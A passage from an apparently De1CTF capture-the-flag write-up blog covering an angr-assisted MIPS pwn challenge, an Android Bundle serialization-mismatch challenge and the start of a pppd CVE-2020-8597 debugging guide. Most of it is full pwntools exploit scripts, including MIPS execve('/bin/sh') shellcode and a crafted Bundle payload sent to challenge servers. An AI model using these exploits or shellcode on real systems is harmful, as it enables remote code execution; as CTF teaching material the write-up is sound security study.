-rf ./1"</span>.split(<span class="string">" "</span>))</span><br><span class="line">        ret.wait()</span><br><span class="line">        ret=subprocess.Popen(<span class="string">"rm -rf ./1.gz"</span>.split(<span class="string">" "</span>))</span><br><span class="line">        ret.wait()</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># start</span></span><br><span class="line">        p=remote(<span class="string">'106.53.114.216'</span>,<span class="number">9999</span>)</span><br><span class="line">        do_pow()</span><br><span class="line">        <span class="comment">#get binart</span></span><br><span class="line">        p.readuntil(<span class="string">"="</span>*<span class="number">15</span>+<span class="string">"\n"</span>)</span><br><span class="line">        data=p.readuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">        f=open(<span class="string">"./"</span>+str(<span class="number">1</span>)+<span class="string">".gz"</span>,<span class="string">"w+"</span>)</span><br><span class="line">        data=base64.b64decode(data)</span><br><span class="line">        f.write(data)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="comment"># get finished</span></span><br><span class="line">        ret=subprocess.Popen(<span class="string">"gunzip ./1.gz"</span>.split(<span class="string">" "</span>))</span><br><span class="line">        ret.wait()</span><br><span class="line">        ret=subprocess.Popen(<span class="string">"chmod +x ./1"</span>.split(<span class="string">" "</span>))</span><br><span class="line">        ret.wait()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=process(<span class="string">"qemu-mipsel -L /usr/mipsel-linux-gnu/ ./1"</span>.split(<span class="string">" "</span>))</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>):</span><br><span class="line">        func=analys()</span><br><span class="line">        payload=<span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> func:</span><br><span class="line">            <span class="keyword">if</span>(len(_)&gt;=<span class="number">109</span>*<span class="number">4</span>):<span class="comment"># certain</span></span><br><span class="line">                payload=type_1(_)+payload</span><br><span class="line">            <span class="keyword">elif</span> (len(_)&lt;=<span class="number">49</span>*<span class="number">4</span> <span class="keyword">and</span> len(_)&gt;=<span class="number">47</span>*<span class="number">4</span>):<span class="comment"># s[0]:1/3 times</span></span><br><span class="line">                payload=type_2(_)+payload</span><br><span class="line">            <span class="keyword">elif</span> (len(_)==<span class="number">74</span>*<span class="number">4</span>):<span class="comment"># certain</span></span><br><span class="line">                payload=type_3(_)+payload</span><br><span class="line">            <span class="keyword">elif</span> (len(_)&gt;=<span class="number">76</span>*<span class="number">4</span> <span class="keyword">and</span> len(_)&lt;=<span class="number">80</span>*<span class="number">4</span>):<span class="comment"># s[0]:1/3/5 times</span></span><br><span class="line">                payload=type_4(_)+payload</span><br><span class="line">            <span class="keyword">elif</span> (len(_)&gt;=<span class="number">63</span>*<span class="number">4</span> <span class="keyword">and</span> len(_)&lt;=<span class="number">66</span>*<span class="number">4</span>): <span class="comment">#s[0] 1/4/3 times</span></span><br><span class="line">                payload=type_5(_)+payload</span><br><span class="line">            <span class="keyword">elif</span> (len(_)&gt;=<span class="number">42</span>*<span class="number">4</span> <span class="keyword">and</span> len(_)&lt;=<span class="number">44</span>*<span class="number">4</span>):</span><br><span class="line">                payload=type_6(_)+payload</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> len(_)/<span class="number">4</span></span><br><span class="line">                <span class="keyword">print</span> (_)</span><br><span class="line">                print(<span class="string">"Ouch! An erron was detected!"</span>)</span><br><span class="line">        get_flag(payload)</span><br><span class="line">      </span><br><span class="line">    ret=subprocess.Popen(<span class="string">"rm -rf ./1*"</span>.split(<span class="string">" "</span>))</span><br><span class="line">    ret.wait()</span><br></pre></td></tr></table></figure></p><h4><span id="angr">Angr</span></h4><p>I expected that it could be solved within two seconds, however, I found that it could not succeed in about 1.3 seconds during the game. This mythod which takes 1.5s is a little slower but I think this one is better.（abs checker needs z3） Exploit comes from MozhuCY@Nu1L and Mr.R@Nu1L .</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">'angr'</span>).setLevel(<span class="string">'ERROR'</span>)</span><br><span class="line">logging.getLogger(<span class="string">'angr.analyses'</span>).setLevel(<span class="string">'ERROR'</span>)</span><br><span class="line">logging.getLogger(<span class="string">'pwnlib.asm'</span>).setLevel(<span class="string">'ERROR'</span>)</span><br><span class="line">logging.getLogger(<span class="string">'angr.analyses.disassembly_utils'</span>).setLevel(<span class="string">'ERROR'</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"ERROR"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span><span class="params">(hash)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">                tmp = chr(i)+chr(j)+chr(k)</span><br><span class="line">                <span class="keyword">if</span> hash == hashlib.sha256(tmp).hexdigest():</span><br><span class="line">                    <span class="keyword">print</span> tmp</span><br><span class="line">                    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment">#21190da8c2a736569d9448d950422a7a a1 &lt; a2</span></span><br><span class="line"><span class="comment">#2a1fae6743ccdf0fcaf6f7af99e89f80 a2 &lt;= a1</span></span><br><span class="line"><span class="comment">#8342e17221ff79ac5fdf46e63c25d99b a1 &lt; a2</span></span><br><span class="line"><span class="comment">#51882b30d7af486bd0ab1ca844939644 a2 &lt;= a1</span></span><br><span class="line">tb = &#123;</span><br><span class="line">    <span class="string">"6aa134183aee6a219bd5530c5bcdedd7"</span>:&#123;</span><br><span class="line">        <span class="string">'21190da8c2a736569d9448d950422a7a'</span>:&#123;</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">"\xed\xd1\xda\x33"</span>,</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">"\x87\x6e\x45\x82"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'2a1fae6743ccdf0fcaf6f7af99e89f80'</span>:&#123;</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">'\xb7\x13\xdf\x8d'</span>,</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">'\x2f\x0f\x2c\x02'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"745482f077c4bfffb29af97a1f3bd00a"</span>:&#123;</span><br><span class="line">        <span class="string">'21190da8c2a736569d9448d950422a7a'</span>:&#123;</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">"\x57\xcf\x81\xe7"</span>,</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">"\x80\xbb\xdf\xb1"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'2a1fae6743ccdf0fcaf6f7af99e89f80'</span>:&#123;</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">"\x95\x3e\xf7\x4e"</span>,</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">"\x1a\xc3\x00\x92"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"610a69b424ab08ba6b1b2a1d3af58a4a"</span>:&#123;</span><br><span class="line">        <span class="string">'21190da8c2a736569d9448d950422a7a'</span>:&#123;</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">"\xfb\xef\x2b\x2f"</span>,</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">"\x10\xbd\x00\xac"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'2a1fae6743ccdf0fcaf6f7af99e89f80'</span>:&#123;</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">'\xbd\x7a\x55\xd3'</span>,</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">'\xbc\xbb\xff\x4a'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"b93e4feb8889770d981ef5c24d82b6cc"</span>:&#123;</span><br><span class="line">        <span class="string">'21190da8c2a736569d9448d950422a7a'</span>:&#123;</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">"\x2f\xfb\xef\x2b"</span>,</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">"\xac\x10\xbd\x00"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'2a1fae6743ccdf0fcaf6f7af99e89f80'</span>:&#123;</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">'\x4a\xbc\xbb\xff'</span>,</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">'\xd3\xbd\x7a\x55'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># hd = [i.start()for i in re.finditer("e0ffbd27".decode("hex"),f)]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findhd</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        code = f[addr:addr + <span class="number">4</span>]</span><br><span class="line">        <span class="keyword">if</span>(code == <span class="string">"e0ffbd27"</span>.decode(<span class="string">"hex"</span>)):</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        addr -= <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dejmp</span><span class="params">(code)</span>:</span></span><br><span class="line">    c = <span class="string">""</span></span><br><span class="line">    d = Cs(CS_ARCH_MIPS,CS_MODE_MIPS32)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> d.disasm(code,<span class="number">0</span>):</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"b"</span> <span class="keyword">in</span> i.mnemonic <span class="keyword">or</span> <span class="string">"j"</span> <span class="keyword">in</span> i.mnemonic):</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">        <span class="comment">#print("0x%x:\t%s\t%s"%(i.address,i.mnemonic,i.op_str))</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">            c += code[i.address:i.address+<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="comment"># @func_set_timeout(1)</span></span><br><span class="line"><span class="comment"># @timeout_decorator.timeout(1)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(func_addr,find,avoid)</span>:</span></span><br><span class="line">    <span class="comment"># p = angr.Project(filename,auto_load_libs = False)</span></span><br><span class="line">    start_address = func_addr</span><br><span class="line">    state = p.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    tmp_addr = <span class="number">0x20000</span></span><br><span class="line"></span><br><span class="line">    ans = claripy.BVS(<span class="string">'ans'</span>, <span class="number">4</span> * <span class="number">8</span>)</span><br><span class="line">    state.memory.store(tmp_addr, ans)</span><br><span class="line">    state.regs.a0 = <span class="number">0x20000</span></span><br><span class="line"></span><br><span class="line">    sm = p.factory.simgr(state)</span><br><span class="line">    sm.explore(find=find,avoid=avoid)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sm.found:</span><br><span class="line">        solution_state = sm.found[<span class="number">0</span>]</span><br><span class="line">        solution = solution_state.se.eval(ans)<span class="comment">#,cast_to=str)</span></span><br><span class="line">        <span class="comment"># print(hex(solution))</span></span><br><span class="line">        <span class="keyword">return</span> p32(solution)[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Calc</span><span class="params">(func_addr,find,avoid)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tmp1 = hashlib.md5(dejmp(f[avoid - <span class="number">0x80</span>:avoid])).hexdigest()</span><br><span class="line">        tmp2 = hashlib.md5(f[avoid<span class="number">-0xdc</span>:avoid<span class="number">-0xdc</span>+<span class="number">4</span>]).hexdigest()</span><br><span class="line">        tmp3 = hashlib.md5((f[avoid - <span class="number">0x24</span>:avoid<span class="number">-0x20</span>])).hexdigest()</span><br><span class="line">        <span class="keyword">return</span> tb[tmp1][tmp2][tmp3]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ret = calc(func_addr + base,find + base,avoid + base)</span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"%s %s %s %x"</span>%(tmp1,tmp2,tmp3,func_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># calc(0x401b34,0x401978,0x401c48)</span></span><br><span class="line"><span class="comment"># calc(0x401978,0x401b08,0x401b18)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if __name__=="__main__":</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.system(<span class="string">"rm out.gz"</span>)</span><br><span class="line">        os.system(<span class="string">"rm out"</span>)</span><br><span class="line">        r = remote(<span class="string">"106.53.114.216"</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">        r.recvline()</span><br><span class="line">        sha = r.recvline()</span><br><span class="line">        sha = sha.split(<span class="string">"\""</span>)[<span class="number">1</span>]</span><br><span class="line">        s = pow(sha)</span><br><span class="line">        r.sendline(s)</span><br><span class="line"></span><br><span class="line">        log.success(<span class="string">"pass pow"</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"===============\n"</span>)</span><br><span class="line">        dump = r.recvline()</span><br><span class="line"></span><br><span class="line">        log.success(<span class="string">"write gz"</span>)</span><br><span class="line"></span><br><span class="line">        o = open(<span class="string">"out.gz"</span>,<span class="string">"wb"</span>)</span><br><span class="line">        o.write(dump.decode(<span class="string">"base64"</span>))</span><br><span class="line">        o.close()</span><br><span class="line"></span><br><span class="line">        log.success(<span class="string">"gunzip"</span>)</span><br><span class="line">        os.system(<span class="string">"gzip -d out.gz"</span>)</span><br><span class="line">        os.system(<span class="string">"chmod 777 out"</span>)</span><br><span class="line">        <span class="comment"># r = remote("127.0.0.1",8088)</span></span><br><span class="line">        log.success(<span class="string">"angr"</span>)</span><br><span class="line">        <span class="comment"># filename = "./1294672722"</span></span><br><span class="line">        filename = <span class="string">"out"</span></span><br><span class="line">        base = <span class="number">0x400000</span></span><br><span class="line">        p = angr.Project(filename,auto_load_libs = <span class="keyword">False</span>)</span><br><span class="line">        f = open(filename,<span class="string">"rb"</span>).read()</span><br><span class="line">        final = <span class="number">0xb30</span></span><br><span class="line"></span><br><span class="line">        vd = [i.start()<span class="keyword">for</span> i <span class="keyword">in</span> re.finditer(<span class="string">"25100000"</span>.decode(<span class="string">"hex"</span>),f)]</span><br><span class="line">        vd = vd[::<span class="number">-1</span>]</span><br><span class="line">        chk = <span class="string">""</span></span><br><span class="line">        n = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(vd) - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span>(vd[i] &lt;= <span class="number">0x2000</span>):</span><br><span class="line">                n += <span class="number">1</span></span><br><span class="line">                func = findhd(vd[i])</span><br><span class="line">                find = findhd(vd[i + <span class="number">1</span>])</span><br><span class="line">                avoid = vd[i]</span><br><span class="line">                ret = Calc(func,find,avoid)</span><br><span class="line">                <span class="comment"># print ret</span></span><br><span class="line">                chk += ret</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">        func = findhd(vd[len(vd) - <span class="number">1</span>])</span><br><span class="line">        find = final</span><br><span class="line">        avoid = vd[len(vd) - <span class="number">1</span>]</span><br><span class="line">        ret = Calc(func,find,avoid)</span><br><span class="line">        <span class="comment"># print ret</span></span><br><span class="line">        chk += ret</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> chk.encode(<span class="string">"hex"</span>)</span><br><span class="line">        <span class="comment"># chk = 'f1223fb171a0e700f3447552d3bd7a55a1f0a2f300809c0046e5fd5ed12c9696000000be961a961a00a420e60cf4f00800060000e54961e3a366c9acd3bd7a55'</span></span><br><span class="line">        <span class="comment"># chk = chk.decode('hex')</span></span><br><span class="line">        r.recvuntil(<span class="string">"Faster"</span>)</span><br><span class="line">        r.sendafter(<span class="string">"&gt;"</span>,chk)</span><br><span class="line">        context.arch = <span class="string">'mips'</span></span><br><span class="line">        success(r.recvuntil(<span class="string">"Name"</span>))</span><br><span class="line">        r.sendafter(<span class="string">"&gt;"</span>,<span class="string">"g"</span>*<span class="number">8</span>)</span><br><span class="line">        ret_addr = vd[<span class="number">1</span>]<span class="number">-0x34</span><span class="number">-0x240</span>+base</span><br><span class="line">        success(hex(ret_addr))</span><br><span class="line">        shellcode = <span class="string">'la $v1,&#123;&#125;;'</span>.format(hex(ret_addr))</span><br><span class="line">        shellcode += <span class="string">'jr $v1;'</span></span><br><span class="line">        shellcode = asm(shellcode)</span><br><span class="line">        print(shellcode.encode(<span class="string">'hex'</span>))</span><br><span class="line">        r.sendafter(<span class="string">"&gt;"</span>,shellcode)</span><br><span class="line">        r.sendafter(<span class="string">"Faster &gt; "</span>,chk)</span><br><span class="line">        success(r.recvuntil(<span class="string">"Name"</span>))</span><br><span class="line">        r.sendafter(<span class="string">"&gt;"</span>,<span class="string">"gg"</span>)</span><br><span class="line">        shellcode = <span class="string">''</span></span><br><span class="line">        shellcode += <span class="string">"\xff\xff\x06\x28"</span></span><br><span class="line">        shellcode += <span class="string">"\xff\xff\xd0\x04"</span></span><br><span class="line">        shellcode += <span class="string">"\xff\xff\x05\x28"</span></span><br><span class="line">        shellcode += <span class="string">"\x01\x10\xe4\x27"</span></span><br><span class="line">        shellcode += <span class="string">"\x0f\xf0\x84\x24"</span></span><br><span class="line">        shellcode += <span class="string">"\xab\x0f\x02\x24"</span></span><br><span class="line">        shellcode += <span class="string">"\x0c\x01\x01\x01"</span></span><br><span class="line">        shellcode += <span class="string">"/bin/sh"</span></span><br><span class="line">        print(len(shellcode))</span><br><span class="line">        r.sendafter(<span class="string">"&gt;"</span>,shellcode)</span><br><span class="line">        r.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br></pre></td></tr></table></figure><h2><span id="broadcasttest">BroadCastTest</span></h2><p>这道题是一道android pwn 主要的漏洞点是关于序列化与反序列化不匹配的漏洞 这道题主要是由CVE-2017-13311等启发而成</p><p>可以阅读https://xz.aliyun.com/t/2364这篇文章，里面详细的说明了类似漏洞的原理</p><p>在apk中，首先读取了Base64字符串，base64deocdeo之后将其作为一个Bundle放到广播中，发送给Receiver2 Receiver2接收到广播，取出Bundle，再从Bundle里面取出key为command的值，判断是否为getflag，不是的话就可以继续广播到Receiver3 Receiver3接收到广播，取出Bundle，判断command是否为getflag，是的话就输出Congratulation</p><p>正常途径是不能绕过这个判断的，但是在apk中存在一个com.de1ta.broadcasttest.MainActivity$Message类，里面的序列化和反序列化是不匹配的</p><p>在Receiver2中判断会command是否为flag会导致Bundle进行反序列化，之后发送给Receiver3的时候会进行序列化，最后Receiver3接收到Bundle后会进行最后一次反序列化</p><p>利用漏洞，可以在Receiver2中反序列化的时候获取不到key为command的string，在序列化之后就出现了key为command，值为getflag的string，然后Receiver3的check就能通过，最终获取到flag</p><p>下面是exp <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line">from hashlib import sha256</span><br><span class="line">import itertools</span><br><span class="line">import string</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def proof_of_work(chal):</span><br><span class="line">    #for i in itertools.permutations(string.ascii_letters+string.digits, 4):</span><br><span class="line">    for i in itertools.permutations([chr(i) for i in range(256)], 4):</span><br><span class="line">        sol = &apos;&apos;.join(i)</span><br><span class="line">        if sha256(chal + sol).digest().startswith(&apos;\0\0\0&apos;):</span><br><span class="line">            return sol</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = &apos;SAEAAEJOREwDAAAACAAAAG0AaQBzAG0AYQB0AGMAaAAAAAAABAAAACwAAABjAG8AbQAuAGQAZQAxAHQAYQAuAGIAcgBvAGEAZABjAGEAcwB0AHQAZQBzAHQALgBNAGEAaQBuAEEAYwB0AGkAdgBpAHQAeQAkAE0AZQBzAHMAYQBnAGUAAAAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAwAAAA0AAAA0AAAADQAAAAAAAAAHAAAAYwBvAG0AbQBhAG4AZAAAAAAAAAAHAAAAZwBlAHQAZgBsAGEAZwAAAAcAAABjAG8AbQBtAGEAbgBkAAAAAAAAAA0AAABQAGEAZABkAGkAbgBnAC0AVgBhAGwAdQBlAAAA&apos;</span><br><span class="line">b = base64.b64decode(a)</span><br><span class="line">p = remote(&apos;206.189.186.98&apos;, 8848)</span><br><span class="line">p.recvuntil(&apos;chal= &apos;)</span><br><span class="line">chal = p.recvuntil(&apos;\n&apos;)[:-1]</span><br><span class="line">p.recvuntil(&apos;&gt;&gt;\n&apos;)</span><br><span class="line">sol = proof_of_work(chal)</span><br><span class="line">p.send(sol)</span><br><span class="line">p.recvuntil(&apos;size&apos;)</span><br><span class="line">p.sendline(str(len(b)))</span><br><span class="line">p.recvuntil(&apos;please input payload:&apos;)</span><br><span class="line">p.send(b)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h2><span id="pppd">pppd</span></h2><p>这道题是要求写CVE-2020-8597的1 day exp 这个cve本身其实是非常简单的，就单纯一个栈溢出 但是难的是与pppd进行通信和在mips环境下面进行调试</p><p>在比赛的时候大部分队伍都没有找到与pppd通信的办法，因此我就直接放出提示，使用socat与pppd进行通信</p><p>接下来介绍的是如何调试的方法</p><p>首先题目默认关闭了network</p><p>在/etc/init.d/S40network, 将注释全部删掉，然后修改start.sh脚本，将-net none删除，加上-redir tcp:9999::9999 -redir tcp:4242::4242，这样就配置好network了</p><p>然后修改/etc/inittab 将 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ttyS0::sysinit:/pppd auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br></pre></td></tr></table></figure></p><p>修改为 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ttyS0::sysinit:/bin/sh</span><br></pre></td></tr></table></figure></p><p>然后到github下载一个<a href="https://github.com/hugsy/gdb-static/blob/master/gdbserver-7.12-mips-be" target="_blank" rel="noopener">gdbserver</a>, 